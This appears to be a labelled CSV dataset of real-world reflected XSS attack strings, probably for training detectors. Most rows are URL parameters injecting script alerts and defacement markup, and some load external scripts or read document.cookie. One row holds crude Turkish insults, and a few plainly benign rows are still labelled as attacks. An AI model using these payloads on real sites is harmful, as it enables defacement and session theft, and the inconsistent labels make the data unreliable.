Payload,Label
"id=%22%3E%3Cscript%3Ealert(%22Topunuzun+am%FDna+koyim+sos<br/>yeteler+lan%20%FEerefsizler%20hem%20bu%20okulda%20okuyorsunuz%20ve%20bilgisayar%FDn%20ba%FE%FDndas%F<br/>Dn%FDz%20%FE%FCk%FCr%20etmeyip%20pesimism%20bunalma%20giriyorusunuz%20a.q%20ezikleri%20size%20verem%<br/>20a.q%22)%3C/script%3E%3Cmarque%3E%3Ch1%3ETopunuzun+am%FDna+koyim+sosyeteler+lan%20%FEerefsizler%20h<br/>em%20bu%20okulda%20okuyorsunuz%20ve%20bilgisayar%FDn%20ba%FE%FDndas%FDn%FDz%20%FE%FCk%FCr%20etmeyip%<br/>20pesimism%20bunalma%20giriyorusunuz%20a.q%20ezikleri%20size%20verem%20a.q%3Cbr%3Estarext%20ve%20can<br/>dark%20sizi%20siksin%20emmi%20ve%20bizim%20alemimiz%3Cbr%3Ewww.trtekforum.com%3Cbr%3ESize%20olan%20k<br/>%FCf%FCrlerim,g%F6z%FCm%20%F6n%FCnde%20sayg%FDm%20olsun%3C/h1%3E%3C/marquee%3E",1
prod_id=1276&id=150&grpid=1276&msg=%3CSCRIPT%3Eale<br/>rt('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3<br/>C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/foroc<br/>ibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
username=%22%20style=-moz-binding:url(http://zucker.schokokeks.org/~la<br/>rs/xss/username.xml%23username)%20test=%22,1
q=http://www.Cyber-warrior.org&fr=AGfNLKR0gFwlq1OTqoBW9CD05s00_1Pi<br/>EgAAAAAAAAAA&gl=us&hl=en,1
"sitename=<script>alert(""XSS"")</script>&pagename=<s<br/>cript>alert(""XSS"")</script>",1
HDGO_au=1&Ntt=%22%3E%3Cscript%3Ealert('Hello%20World!')%<br/>3C/script%3E&jid=5BD1DACX83E66139C8A67FDX6C27EA9X&Ntk=All&siteId=1&osId=972&merch=popular_searches_W<br/>eather&HDGO_ae=c&N=4294916932&oldCat=96092&Nty=1,1
msg=%3CSCRIPT%3Ealert('Norehem%20was%20here')%3C/SCRIPT%3E,1
code=oun_search.htm&srch=<script>alert('xss -<br/>Aitoc')</script>x=7&y=18,1
action=search&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/<br/>SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3<br/>C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gi<br/>f%22%3E%3C/CENTER%3E,1
ImageNme=&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SC<br/>RIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/<br/>H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%<br/>22%3E%3C/CENTER%3E,1
~pid=398&pCatName=%3Ch1%3EFucked%3C/h1%3E,1
PageNo=0%20&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/S<br/>CRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C<br/>/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br/>%22%3E%3C/CENTER%3E,1
"lang=""><script>alert(/THE-SH0CK-B0Y/)</script>",1
showTopMembers=today&offset=1&results=kl%3CSCRIPT%20SRC=http://ha.cke<br/>rs.org/xss.js%3E%3C/SCRIPT%3E,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/title%3E%3C/title<br/>%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/2007/02/tux.p<br/>ng%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20size=7%3<br/>Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%<br/>20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
type=http%3A%2F%2Faa%3Cscript%3Ealert%28'Hello%20Worl<br/>d!'%29%3C%2Fscript%3E,1
id=3564&src=&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeR<br/>e!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3<br/>C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/nore<br/>hemzu4.gif%22%3E%3C/CENTER%3E,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/title%3E%3C/title%3<br/>E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/2007/02/tux.png<br/>%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20size=7%3Ep<br/>rincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20<br/>size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
epi-content=GENERIC&calendarListBO=*A%22%3E%<br/>3Cscript%3Ealert(1)%3C/script%3E*Ball*Call*Dnull*Enull*Fsearch*Gfalse*Htrue*I&beanID=1390738014&view<br/>ID=calendar_list,1
PageNo=10%20&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/S<br/>CRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C<br/>/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif<br/>%22%3E%3C/CENTER%3E,1
city=%3Cscript%3Ealert('Hello%20World!');%3C/sc<br/>ript%3E&state=33&date=&eventType=22,1
pagename=%3Ctitle%3Eprincss%20-xss<br/>%3C/title%3E%3C/title%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpr<br/>ess.com/2007/02/tux.png%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20fa<br/>ce=Verdana%20size=7%3Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3<br/>Cfont%20face=Verdana%20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/titl<br/>e%3E%3C/title%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/<br/>2007/02/tux.png%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verda<br/>na%20size=7%3Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20<br/>face=Verdana%20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
kompakt=1&sh=1&qu=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/title%3E%3C/tit<br/>le%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/2007/02/tux<br/>.png%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20size=7<br/>%3Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdan<br/>a%20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
serial=01&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%<br/>20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1<br/>%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload<br/>/norehemzu4.gif%22%3E%3C/CENTER%3E,1
id=show&par=&typ=1&viewnr=%22%3Cmarquee%3E%3Cfont%20color=red%3ERubberDuck%3C/font<br/>%3E%3C/marquee%3E,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/title%3E%3C<br/>/title%3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/2007/02<br/>/tux.png%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20si<br/>ze=7%3Eprincss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Ve<br/>rdana%20size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
q=%22%3E%3Cscript%20src=http://zucker.schokokeks.org/~lars/i<br/>.js%3E%3C/script%3E,1
pagename=%3Ctitle%3Eprincss%20-xss%3C/title%3E%3C/title%<br/>3E%3Cp%20align=center%3E%3Cimg%20border=0%20src=http://alexzelder.files.wordpress.com/2007/02/tux.pn<br/>g%20width=291%20height=356%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%20size=7%3E<br/>princss%20-%20xss%20%3C/font%3E%3C/b%3E%3C/p%3E%3Cp%20align=center%3E%3Cb%3E%3Cfont%20face=Verdana%2<br/>0size=7%3E%3Ca%20href=http://www.hslteam.org/foro%3E%3Cfont%20color=,1
normal_login=yes&redirect_path=&redirect_query=&username=%22%3E%3Cscript%<br/>3Ealert%281%29%3C%2Fscript%3E&code=&scisendit.x=20&scisendit.y=8&scisendit=Sign+In&my_science_login=<br/>Sign+In&my_science_login.y=0&my_science_login.x=0&ISLOGIN=yes,1
"page=search&q=""><script>alert(""g3"");</script>",1
Mensaje=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH<br/>1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCEN<br/>TER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CE<br/>NTER%3E&Destination=foros.asp,1
errNum=703&errDesc=%3CSCRIPT%3Ealert('Norehem%<br/>20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E<br/>%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/<br/>upload/norehemzu4.gif%22%3E%3C/CENTER%3E&errType=%5Bobject+Error%5D&errFile=%2FVetPro%2Flogin%2Easp&<br/>errPgm=undefined,1
TxtSearchKey=%22%3C%2Fscript%3E%3Cscript%3Ealert%28%22Hack<br/>ed+%3A+%29+CrypTic%22%29%3C%2Fscript%3E&image2.x=25&image2.y=13,1
page=new_account&server=6&action=validate&ref=,1
message=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3<br/>CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CC<br/>ENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/<br/>CENTER%3E,1
id=%3Cscript%3Ealert(/xss%20by%20Bl4ckBon3r%20/)%3C/script%3E,1
q=%3Cscript%3Ealert%28%27Daemien%27%29%3C%2Fscript%3E&offset=0,1
SearchForm=%25%25SearchForm%25%25&cmd=search&maxFiles=10&sort=H<br/>its&stemming=Yes&fuzziness=4&relation=and&request=%3CSCRIPT%3Ealert%28%27Norehem+WaS+HeRe%21%21%27%2<br/>9%3C%2FSCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem+was+here%3C%2Fmarquee%3E%3C%2FH1%3E%3C%<br/>2FH1%3E%3C%2FH1%3E%3CCENTER%3E%3CIMG+SRC%3D%22http%3A%2F%2Fwww.cibernautica.com%2Fforocibernautica%2<br/>Fupload%2Fnorehemzu4.gif%22%3E%3C%2FCENTER&search.x=31&search.y=12,1
EXPS=%22%3C%2Fscript%3E%3Cscript%3Ealert%28%22Hacked+%3A+%2<br/>9+CrypTic%22%29%3C%2Fscript%3E&SearchType=All,1
search=%3Cscript%3Ealert%28%27Daemien%27%29%3C%2Fscript%3E,1
offset=50&cid=&src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r0<br/>0tday%20gencorhangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gencor<br/>hangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gencorhangaz<br/>i.com%22)%3C/script%3E,1
ID=Xss%20By%20{%20Bl4ckBon3r%20}%3Cscript%3Ealert(/xss/)%3C/scrip<br/>t%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gencorh<br/>angazi.com%22)%3C/script%3E,1
as_q=%22%3C%2Fscript%3E%3Cscript%3Ealert%28%22Hack<br/>ed+%3A+%29CrypTic%22%29%3C%2Fscript%3E&site=&as_epq=&num=10&as_oq=&sort=&as_eq=,1
src=http://www.kozmetikmarket.com/catinfo.asp?src=%22%3E%3Csc<br/>ript%3Ealert(%22hacked%20by%20r00tday%20gencorhangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gencorha<br/>ngazi.com%22)%3C/script%3E,1
id=Xss%20By%20{%20Bl4ckBon3r%20}%3Cscript%3Ealert(/xss%20by<br/>%20Bl4ckBon3r/)%3C/script%3E,1
price=%3C/textarea%3E%3Cbr%3E%3Ccode+onmouseover=a=eval;<br/>b=alert;a(b(/Hacked/.source));%3EHACKED+BY+Mister+C.%3C/code%3E&model=%3C/textarea%3E%3Cbr%3E%3Ccode<br/>+onmouseover=a=eval;b=alert;a(b(/Hacked/.source));%3EHACKED+BY+Mister+C.%3C/code%3E&echipare=%3C/tex<br/>tarea%3E%3Cbr%3E%3Ccode+onmouseover=a=eval;b=alert;a(b(/Hacked/.source));%3EHACKED+BY+Mister+C+%3C/c<br/>ode%3E&motorizare=%3C/textarea%3E%3Cbr%3E%3Ccode+onmouseover=a=eval;b=alert;a(b(/Hacked/.source));%3<br/>EMOVE+MOUSE+OVER+THIS+AREA%3C/code%3E,1
id=Xss%20By%20{%20Bl4ckBon3r%20}%3Cscript%3Ealert(/xss%20by%20Bl4ckB<br/>on3r/)%3C/script%3E,1
Textarea=%3Ch1%3ECharlesManson%20Uyar%FDyo,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gen<br/>corhangazi.com%22)%3C/script%3E,1
stype=basic&perPage=20&summary=yes&search=%22%3Cscript%3Ealert<br/>%28%22HACKED%22%29%3C%2Fscript%3E&within=entire&searchmethod=all&sort=rank&Submit=&button.x=32&butto<br/>n.y=3&button=Submit,1
search=%22%3C%2Fscript%3E%3Cscript%3Ealert%28%22Hacke<br/>d+%3A+%29CrypTic%22%29%3C%2Fscript%3E&Search.x=33&Search.y=10&choice=0&volume=,1
offset=432&cid=1&src=%22%3E%3Cscript%3Ealert(%22hacked%20<br/>by%20r00tday%20gencorhangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%<br/>20gencorhangazi.com%22)%3C/script%3E,1
offset=45&cid=2327&src=%22%3E%3Cscript%3Ealert(%22hacked%20b<br/>y%20r00tday%20gencorhangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20genc<br/>orhangazi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20gencorhang<br/>azi.com%22)%3C/script%3E,1
src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tday%20g<br/>encorhangazi.com%22)%3C/script%3E,1
id=Xss%20By%20{%20Bl4ckBon3r%20}%3Cscript%3Ealert(/xss/)%3C/script%3E,1
q=%3Cscript%3Ealert%28%22xss+by+kevin%5Fktjm%22%29%3C%2Fscript%3E&sp=,1
ADTEXT=%22%3Cscript%3Ealert%28%22HACKED%22%29%3C%2Fscript%3E&TUSAR<br/>A=Find,1
"urun_id=48&firma_id=&kat_id=&grup_id=""><script>alert(<br/>""BackDoor"")</script>",1
src=%22%3E%3Cscript%3Ealert%28%22hacked+by+r00tday+gencorhanga<br/>zi.com%22%29%3C%2Fscript%3E&Submit=Ara&cid=&brw=0,1
cid=26&src=%22%3E%3Cscript%3Ealert(%22hacked%20by%20r00tda<br/>y%20gencorhangazi.com%22)%3C/script%3E,1
mp3=%3Cmarquee%3E%3Ch1%3ELangy+was+here%3C%2Fh1%3E%3C<br/>%2Fmarquee%3E&Submit=Get%21,1
PageID=37,1
Err=%3CSCRIPT%20SRC=http://ihatemyworld.org/xss.js%3E%3C/SC<br/>RIPT%3E,1
type=1&freecontent=%22%3Cscript%3Ealert%28%22HACKED%22%29%3C%2F<br/>script%3E&depts=0&brands=0&G%F6nder=ARA,1
surname=%22%3C%2Fscript%3E%3Cscript%3Ealer<br/>t%28%22Hacked+%3A+%29+CrypTic%22%29%3C%2Fscript%3E&x=6&y=13,1
ie=iso-8859-1&yaql=%22%3C%2Fscript%3E%3Cscript%<br/>3Ealert%28%22Hacked+%3A+%29+CrypTic%22%29%3C%2Fscript%3E&ytitle=&ytext=&ysound=&yrankt=r_tfidf&yrank<br/>x=r_prox&yranka=r_assoc&yrankm=r_mark&ycount=10&ysort=yrank&Submit=%A0Search+%BB,1
Fatal=0&Severity=3&Category=3&EventID=3201&Hi<br/>deResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1<br/>%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3C<br/>IMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID=32<br/>01&HideResetBtn=0&HideDetails=1&Msg=http://www.montanamountainhomes.com/MiddleTier/ErrorPage.asp?Fat<br/>al=0&Severity=3&Category=3&EventID=3201&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%<br/>20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E<br/>%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/<br/>upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
idco=0&idc=0&sp=0&birth1=&birth2=&height1=&height2=&weight1=&weight2=&findss<br/>=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fihatemyworld.org%2Fxss.js%3E%3C%2FSCRIPT%3E&top=0&k=gof&k2=gofs,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideResetB<br/>tn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1<br/>%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SR<br/>C=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideRe<br/>setBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%<br/>3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%<br/>20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
letter=%3Cscript%3Ealert(1)%3C/script%3<br/>E,1
Fatal=0&Severity=3&Category=3&EventID=3201&Hi<br/>deResetBtn=0&HideDetails=1&Msg=http://www.emirbarredo.com/MiddleTier/ErrorPage.asp?Fatal=0&Severity=<br/>1&Category=3&EventID=3200&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!<br/>')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H<br/>1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehem<br/>zu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=3&Category=3&EventID=3<br/>201&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3<br/>E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER<br/>%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTE<br/>R%3E,1
Fatal=0&Severity=3&Category=3&EventID=320<br/>1&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%<br/>3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3<br/>E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%<br/>3E,1
Fatal=0&Severity=3&Category=3&EventID=3201&HideRes<br/>etBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3<br/>CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%2<br/>0SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
cid=15659&template=17_204&clogo=1&scrollcolor=000000&scrollt<br/>ext=000044&msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cma<br/>rquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22htt<br/>p://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
Fatal=0&Severity=1&Category=3&EventID=3200&HideR<br/>esetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E<br/>%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG<br/>%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
"option=com_ponygallery&mosmsg=""><script>alert(document.cooki<br/>e)</script>",1
query=%22%3E%3Cscript%3Ealert%2814444324224%29%3C%2Fscript%3E,1
fldSearch=abc%22+onmouseout%3D%22alert%281%29%22&se<br/>nd=Go&action=search,1
Fatal=0&Severity=3&Category=3&EventID=3201<br/>&HideResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3<br/>CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E<br/>%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3<br/>E,1
keyword=%22%3Cscript%3Ealert%28%22HACKED%22%29%3C%2Fscript%3E,1
Tema=%3CSCRIPT%3Ealert('Norehem%20Wa<br/>S%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/<br/>H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/uplo<br/>ad/norehemzu4.gif%22%3E%3C/CENTER%3E&IdMsg=134&IdTopico=69&Msg=R%E9plica,1
msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!<br/>!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/<br/>H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehe<br/>mzu4.gif%22%3E%3C/CENTER%3E,1
Search=ooo%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E,1
search=%22%20onmouseout=%22alert(1)%22,1
Fatal=0&Severity=1&Category=3&EventID=3200&Hid<br/>eResetBtn=0&HideDetails=1&Msg=%3CSCRIPT%3Ealert('Norehem%20WaS%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%<br/>3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CI<br/>MG%20SRC=%22http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif%22%3E%3C/CENTER%3E,1
rc=m&sh=li&ms=sp&ref=000582&q=%3CSCRIPT%3Ealert('Norehem%20WaS<br/>%20HeRe!!')%3C/SCRIPT%3E%3CH1%3E%3CH1%3E%3CH1%3E%3Cmarquee%3ENorehem%20was%20here%3C/marquee%3E%3C/H<br/>1%3E%3C/H1%3E%3C/H1%3E%3CCENTER%3E%3CIMG%20SRC=%22http://www.cibernautica.com/forocibernautica/uploa<br/>d/norehemzu4.gif%22%3E%3C/CENTER%3E,1
searchString=%22%3Cscript%3Ealert%28%22HACKED%22%29%3<br/>C%2Fscript%3E&action=S%F6k,1
SearchText=%22%3E%3Cscript%3Ealert(1)%3C/script%3E,1
